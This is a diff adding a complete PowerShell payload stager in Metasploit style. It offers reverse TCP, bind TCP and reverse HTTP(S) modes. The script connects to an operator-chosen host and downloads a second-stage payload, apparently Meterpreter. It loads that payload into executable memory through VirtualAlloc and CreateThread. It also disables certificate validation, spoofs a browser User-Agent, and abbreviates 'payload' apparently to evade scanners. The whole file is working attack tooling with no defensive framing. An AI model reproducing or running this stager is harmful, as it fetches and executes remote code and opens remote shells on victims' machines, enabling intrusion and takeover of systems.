@@ -1,0 +1,279 @@
+# Get command line parameters
+[CmdLetBinding(DefaultParameterSetName = "bind")]
+Param(
+    # IP address
+    [Parameter(ParameterSetName = "reverse", Position = 0, Mandatory = $True)]
+    [ValidateScript({$_ -match [IPAddress] $_})]
+    [String] $IPAddress,
+
+    # Port
+    [Parameter(ParameterSetName = "reverse", Position = 1)]
+    [Parameter(ParameterSetName = "bind", Position = 0)]
+    [ValidateRange(1, 65535)]
+    [Int] $Port = 4444,
+
+    # URL
+    [Parameter(ParameterSetName = "http", Mandatory = $True)]
+    [ValidatePattern("^(http|https)://")]
+    [String] $URL,
+
+    # Proxy
+    [Parameter(ParameterSetName = "http")]
+    [Switch] $Proxy = $False
+)
+
+# Helper function ripped from PWSP
+function Local:Get-ProcAddress
+{
+    Param(
+        [OutputType([IntPtr])]
+        
+        [Parameter(Position = 0, Mandatory = $True)]
+        [String] $Module,
+            
+        [Parameter(Position = 1, Mandatory = $True)]
+        [String] $Procedure
+    )
+
+    # Get a reference to System.dll in the GAC
+    $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
+        Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
+    $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
+
+    # Get a reference to the GetModuleHandle and GetProcAddress methods
+    $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
+    # Specify parameters to avoid AmbiguousMatchException on recent Windows versions
+    $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress', [Type[]] @([System.Runtime.InteropServices.HandleRef], [String]))
+
+    # Get a handle to the module specified
+    $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
+    $tmpPtr = New-Object IntPtr
+    $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)
+        
+    # Return the address of the function
+    Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef] $HandleRef, $Procedure))
+}
+
+# Helper function ripped from PWSP
+function Local:Get-DelegateType
+{
+    Param(
+        [OutputType([Type])]
+        
+        [Parameter(Position = 0)]
+        [Type[]] $Parameters = (New-Object Type[](0)),
+        
+        [Parameter(Position = 1)]
+        [Type] $ReturnType = [Void]
+    )
+
+    $Domain = [AppDomain]::CurrentDomain
+    $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
+    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
+    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
+    $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
+    $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
+    $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
+    $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
+    $MethodBuilder.SetImplementationFlags('Runtime, Managed')
+    
+    Write-Output $TypeBuilder.CreateType()
+}
+
+# Receive a mtr PL via TCP
+function Local:Receive-PL
+{
+    # Read 4-byte PL length
+    Write-Debug "Reading 4-byte PL length"
+    $buffer = New-Object System.Byte[] 4
+    $read = $stream.Read($buffer, 0, 4)
+    $length = [BitConverter]::ToInt32($buffer, 0)
+
+    # Prepend some ASM to MOV the socket handle into EDI
+    # (64-bit version doesn't seem to be necessary for x64)
+    # mov edi, 0x12345678 ; BF 78 56 34 12 (32-bit)
+    # mov rdi, 0x12345678 ; 48 BF 78 56 34 12 00 00 00 00 (64-bit)
+    Write-Debug "Prepending MOV EDI, <socket> to the PL"
+    $buffer = [BitConverter]::GetBytes($client.Client.Handle.ToInt32())
+    $PL = New-Object System.Byte[] ($length + 5)
+    $PL[0] = 0xBF
+    $PL[1] = $buffer[0]
+    $PL[2] = $buffer[1]
+    $PL[3] = $buffer[2]
+    $PL[4] = $buffer[3]
+
+    # Download the mtr PL
+    Write-Debug "Downloading the mtr PL"
+    $read = $stream.Read($PL, 5, $length)
+    while ($read -lt $length) {
+        $read += $stream.Read($PL, ($read + 5), ($length - $read))
+    }
+}
+
+# Execute a Windows PL
+function Local:Invoke-PL
+{
+    # Allocate a RWX memory region
+    # VirtualAlloc(0, len(d), MEM_COMMIT, PAGE_EXECUTE_READWRITE)
+    Write-Debug "Allocating a RWX memory region"
+    $VirtualAllocAddr = Get-ProcAddress kernel32.dll VirtualAlloc
+    $VirtualAllocDelegate = Get-DelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])
+    $VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocAddr, $VirtualAllocDelegate)
+    $ptr = $VirtualAlloc.Invoke([IntPtr]::Zero, $PL.Length + 1, 0x3000, 0x40)
+
+    # Copy the shellcode
+    Write-Debug "Copying the shellcode"
+    [System.Runtime.InteropServices.Marshal]::Copy($PL, 0, $ptr, $PL.Length)
+
+    # Execute the shellcode
+    Write-Debug "Executing the shellcode"
+    $CreateThreadAddr = Get-ProcAddress kernel32.dll CreateThread
+    $CreateThreadDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
+    $CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateThreadAddr, $CreateThreadDelegate)
+    $ht = $CreateThread.Invoke([IntPtr]::Zero, 0, $ptr, [IntPtr]::Zero, 0, [IntPtr]::Zero)
+
+    # Wait for the shellcode to finish running
+    Write-Debug "Waiting for the shellcode to finish running"
+    $WaitForSingleObjectAddr = Get-ProcAddress kernel32.dll WaitForSingleObject
+    $WaitForSingleObjectDelegate = Get-DelegateType @([IntPtr], [Int32]) ([Int])
+    $WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WaitForSingleObjectAddr, $WaitForSingleObjectDelegate)
+    $WaitForSingleObject.Invoke($ht, 0xFFFFFFFF) | Out-Null
+}
+
+# Start a reverse_tcp stager
+function Local:Start-Reverse
+{
+    # Connect to reverse_tcp exploit/multi/handler
+    Write-Verbose "Connecting to reverse_tcp exploit/multi/handler"
+    try {
+        $client = New-Object System.Net.Sockets.TcpClient($IPAddress, $Port)
+        $stream = $client.GetStream()
+    } catch {
+        $err = $_.Exception.Message
+        Write-Host $err
+        exit
+    }
+
+    # Receive and execute the mtr PL
+    Write-Verbose "Receiving and executing the mtr PL"
+    try {
+        . Receive-PL
+        . Invoke-PL
+    } catch {
+        $err = $_.Exception.Message
+        Write-Host $err
+        exit
+    } finally {
+        # Perform cleanup actions
+        Write-Verbose "Performing cleanup actions"
+        $stream.Close()
+        $client.Close()
+        $stream.Dispose()
+    }
+}
+
+# Start a bind_tcp stager
+function Local:Start-Bind
+{
+    # Open a port for bind_tcp exploit/multi/handler
+    Write-Verbose "Opening port for bind_tcp exploit/multi/handler"
+    try {
+        $endpoint = New-Object System.Net.IPEndPoint([IPAddress]::any, $Port)
+        $listener = New-Object System.Net.Sockets.TcpListener $endpoint
+        $listener.start()
+        $client = $listener.AcceptTcpClient()
+        $stream = $client.GetStream()
+    } catch {
+        $err = $_.Exception.Message
+        Write-Host $err
+        exit           
+    }
+
+    # Receive and execute the mtr PL
+    Write-Verbose "Receiving and executing the mtr PL"
+    try {
+        . Receive-PL
+        . Invoke-PL
+    } catch {
+        $err = $_.Exception.Message
+        Write-Host $err
+        exit
+    } finally {
+        # Perform cleanup actions
+        Write-Verbose "Performing cleanup actions"
+        $stream.Close()
+        $client.Close()
+        $listener.Stop()
+        $stream.Dispose()    
+    }
+}
+
+# Start a reverse_http(s) stager
+function Local:Start-HTTP
+{
+    # Helper functions ripped Ve-Fraim
+    $d = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".ToCharArray()
+    function c($v) { return (([Int[]] $v.ToCharArray() | Measure-Object -Sum).Sum % 0x100 -eq 92) }
+    function t { $f = ""; 1..3 | ForEach-Object { $f += $d[(Get-Random -Maximum $d.Length)] }; return $f }
+    function e { Process { [Array] $x = $x + $_ }; End { $x | Sort-Object {(New-Object Random).next()} } }
+    function g { for ($i = 0; $i -lt 64; $i++) { $h = t; $k = $d | e; foreach ($l in $k) { $s = $h + $l; if (c($s)) {return $s} } } return "9vXU" }
+    $URL = $URL + "/" + (g)
+
+    # Connect to reverse_http(s) exploit/multi/handler
+    Write-Verbose "Connecting to reverse_http(s) exploit/multi/handler"
+    try {
+        # Disable SSL certificate validation
+        [Net.ServicePointManager]::ServerCertificateValidationCallback = { $True }
+        $client = New-Object System.Net.WebClient
+        $client.Headers.Add("User-Agent", "Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)")
+        if ($Proxy) {
+            # Use system proxy settings
+            $p = [System.Net.WebRequest]::GetSystemWebProxy()
+            $p.Credentials = [System.Net.CredentialCache]::DefaultCredentials
+            $client.Proxy = $p
+            $client.UseDefaultCredentials = $True
+        }
+        [System.Byte[]] $PL = $client.DownloadData($URL)
+    } catch {
+        $err = $_.Exception.Message
+        Write-Host $err
+        exit
+    }
+
+    # Execute the mtr PL
+    Write-Verbose "Executing the mtr PL"
+    try {
+        . Invoke-PL
+    } catch {
+        $err = $_.Exception.Message
+        Write-Host $err
+        exit
+    } finally {
+        # Perform cleanup actions
+        Write-Verbose "Performing cleanup actions"
+        $client.Dispose()    
+    }
+}
+
+Write-Host "Hello Framework"
+Write-Host "Copyright (c) <rrr@beeb.in>`n"
+
+# Choose the mode of operation
+switch ($PsCmdlet.ParameterSetName)
+{
+    "reverse" {
+        Write-Host "Connecting to reverse_tcp handler at ${IPAddress}:${Port}`n"
+        . Start-Reverse
+        break
+    }
+    "bind" {
+        Write-Host "Listening for bind_tcp handler connection at port ${Port}`n"
+        . Start-Bind
+        break
+    }
+    "http" {
+        Write-Host "Connecting to reverse_http(s) handler at $URL`n"
+        . Start-HTTP
+        break
+    }
+}
